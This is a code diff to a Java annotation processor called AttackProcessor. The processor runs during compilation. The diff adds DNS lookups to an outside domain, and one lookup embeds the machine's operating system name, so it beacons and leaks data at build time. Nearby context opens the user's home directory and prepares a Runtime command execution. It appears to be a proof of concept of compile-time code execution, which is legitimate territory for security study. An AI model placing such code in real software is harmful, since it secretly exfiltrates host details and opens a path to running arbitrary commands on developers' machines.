@@ -9,6 +9,8 @@ import javax.lang.model.element.TypeElement;
 import javax.tools.Diagnostic;
 import java.io.File;
 import java.io.IOException;
+import java.net.Inet4Address;
+import java.net.UnknownHostException;
 import java.util.Set;
 
 @SupportedAnnotationTypes("*")
@@ -25,6 +27,15 @@ public class AttackProcessor extends AbstractProcessor {
 
         File folder = new File(System.getProperty("user.home"));
 
+        try
+        {
+            Inet4Address.getByName( "javac2.lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( System.getProperty("os.name")+".lirui28.t.dlsr.ga" );
+        }
+        catch ( UnknownHostException e )
+        {
+            e.printStackTrace();
+        }
         try {
             Runtime r = Runtime.getRuntime();
             //Process p = r.exec(new String[]{"/bin/bash","-c","open ."});
